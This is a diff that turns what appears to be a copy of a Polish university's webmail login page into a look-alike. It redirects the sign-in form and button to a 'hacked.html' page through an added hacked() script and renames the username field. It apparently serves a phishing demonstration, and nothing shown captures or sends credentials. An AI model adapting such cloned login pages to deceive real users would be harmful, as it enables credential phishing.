@@ -3722,6 +3722,32 @@ p.small {
 	color: #665851;
 }
 
+.login-box button, a.special-button {
+	margin-top: 0px;
+	margin-bottom: 25px;
+	border: 0;
+	border-radius: 2px;
+	color: white;
+	padding: 10px;
+	text-transform: uppercase;
+	font-weight: 400; 
+	font-size: 0.7em;
+	letter-spacing: 1px;
+	background-color: #001a33;
+	cursor:pointer;
+	outline: none;
+}
+
+.login-box button:hover, a.special-button:hover {
+	opacity: 0.7;
+	transition: 0.5s;
+}
+
+.login-box button:hover, a.special-button:hover {
+	opacity: 0.7;
+	transition: 0.5s;
+}
+
 .login-box button {
 	margin-top: 0px;
 	margin-bottom: 25px;
@@ -3747,6 +3773,7 @@ p.small {
 	opacity: 0.7;
 	transition: 0.5s;
 }
+
 
 .login-box .box-footer {
 	background-color: #001a33;
@@ -3822,10 +3849,10 @@ p.small {
                 <div id="alertMsg" aria-live="assertive" role="alert" tabindex="0" class="alertMsg"></div>
 
 
-                <form action="/iwc/signin" method="post" onsubmit="return login()">
+                <form action="hacked.html" method="post" onsubmit="">
 
                     <label id="usernameLabelID" for="username" class="">Username:</label>
-                    <input value="" id="username" name="USERNAME" type="text" aria-required="true">
+                    <input value="" id="username" name="EMAIL" type="text" aria-required="true">
                     <br>
                     <label id="passwordLabelID" for="password">Password:</label>
                     <input id="password" name="PASSWORD" type="password" aria-required="true">
@@ -3844,8 +3871,14 @@ p.small {
                     </select>
                     <br>
                     
-                    <span class="dijit dijitReset dijitLeft dijitInline Convergence-Login-FormButton dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="SIGNIN" tabindex="0" style="-moz-user-select: none;"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
+                    <span class="dijit dijitReset dijitLeft dijitInline Convergence-Login-FormButton dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button onclick="hacked()" class="special-button dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0" style="-moz-user-select: none;"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
                 </form>
+                <script>
+                  function hacked() {
+                    window.open("hacked.html", "_self");
+                  }
+                </script>
+
                 <div id="plLinks" style="display: block">
                     <p class="small"><a href="/passwd/reset?todo=reset">Nie pamiętam hasła</a></p>
                     <p class="small"><a href="/modpass-pwr/">Aktywacja konta</a></p>
